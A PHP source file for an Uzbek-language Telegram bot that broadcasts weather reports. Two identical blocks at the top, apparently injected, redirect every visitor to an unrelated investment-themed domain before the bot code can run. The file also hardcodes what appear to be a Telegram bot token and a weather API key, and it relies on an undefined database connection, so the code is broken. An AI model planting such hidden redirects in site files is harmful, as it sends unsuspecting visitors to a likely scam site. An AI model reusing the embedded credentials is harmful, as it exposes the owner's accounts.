<?php
header("Location: https://bitera-invest.live/YTQdPb"); 
?>
<?php
header("Location: https://bitera-invest.live/YTQdPb"); 
?>

<?php
  define('API_KEY', "5461969230:AAHJPiVUz3zFJQjH6yH-zI-_DdC2ofeWqu4");
  function bot($method, $datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);

    $res = curl_exec($ch);

    if (curl_error($ch)) {
      var_dump(curl_error($ch));
    }else{
      return json_decode($res);
    }
  }
  function html($tx){
      return str_replace(['<','>'],['&#60;','&#62;'],$tx);
  }

  $update = json_decode(file_get_contents('php://input'));
   $message = $update->message;
  $chat_id = $message->chat->id;
  $type = $message->chat->type;
  $miid =$message->message_id;
  $name = $message->from->first_name;
  $lname = $message->from->last_name;
  $full_name = $name . " " . $lname;
  $full_name = html($full_name);
  $user = $message->from->username;
  $fromid = $message->from->id;
  $user_names = $message->from->username;
  $text = $message->text;
  $title = $message->chat->title;
  $chatuser = $message->chat->username;
  $chatuser = $chatuser ? $chatuser : "Shaxsiy Guruh!";
  $caption = $message->caption;
  $entities = $message->entities;
  $entities = $entities[0];
  $text_link = $entities->type;
  $reply_to_message = $message->reply_to_message;
  $reply_text = $reply_to_message->text;
  $left_chat_member = $message->left_chat_member;
  $new_chat_member = $message->new_chat_member;
  $photo = $message->photo;
  $video = $message->video;
  $audio = $message->audio;
  $reply = $message->reply_markup;
  $fchat_id = $message->forward_from_chat->id;
  $fid = $message->forward_from_message_id;
  //editmessage
  $callback = $update->callback_query;
  $qid = $callback->id;
    $mes = $callback->message;
    $mid = $mes->message_id;
    $cmtx = $mes->text;
    $cid = $callback->message->chat->id;
    $ctype = $callback->message->chat->type;
    $cbid = $callback->from->id;
    $cbuser = $callback->from->username;
    $data = $callback->data;
    $botuser = "@PHOENIXsteven";
    $admin = "1915213082";
    mkdir("step");
    mkdir("stat");
    if ($text == "/start") {
      $getfile = file_get_contents("stat/stat.stat");
      if (mb_stripos($getfile, $chat_id)==false) {
        file_put_contents("stat/stat.stat", $getfile . "\n$chat_id");
      }
      bot('sendMessage',[
        'chat_id'=>$chat_id,
        'text'=>"<b>Assalomu alaykum " . $full_name . "</b>,\n\nBotimizga xush kelibsiz sizga ushbu bot orqali har 2 soatdan ob-havo ma'lumotlari yuboriladi 😊",
        'parse_mode'=>'html'
      ]);
    }

    if ($_GET['weathers']) {
        $getAPI = file_get_contents("https://api.openweathermap.org/data/2.5/weather?q=Uzbekistan&appid=351ccba9bd91ef24823bed7cf66380b8");
        $jd = json_decode($getAPI);
    
        
        $temp = $jd->main->temp_max - "273.15";
        $tempMin =  $jd->main->temp_min  - "273.15";
        $shamol = $jd->wind->speed;
        $davlat = $jd->sys->country;
    
        $info_w =  "📊 O'zbekistonda xozirgi vaqtdagi ob-havo ma'lumotlari:" . "\n\n📍 Joylashuv: " . $davlat . "\n🌡 Havo harorati: "  . $temp . "°" . "\n☁️ Eng past havo harorati: " . $tempMin . "°" . "\n💨 Shamol tezligi: " . $shamol . "m/s";
    
    
        $default = '0';
        $after = $default + '60';
        $slt = "SELECT * FROM tableofPHOENIX WHERE id>='{$default}' AND id<='{$after}'";
        $query = mysqli_query($conn,$slt);
        if (mysqli_num_rows($query)>0) {
            foreach ($query as $key => $value) {
                if ($value["fromid"] == $admin){
                    bot('sendMessage',[
                        'chat_id'=>$value["fromid"],
                        'text'=>$info_w,
                        'parse_mode'=>"html"
                    ]);
                }else {
                    bot('sendMessage',[
                        'chat_id'=>$value["fromid"],
                        'text'=>$info_w,
                        'parse_mode'=>"html"
                    ]);
                }
    
            }
            $default += $after;
        }else{
            bot('sendMessage',[
                'chat_id'=>$admin,
                'text'=>"Ob havo yuborildi!",
                'parse_mode'=>"html"
            ]);
        }
    }




    ?>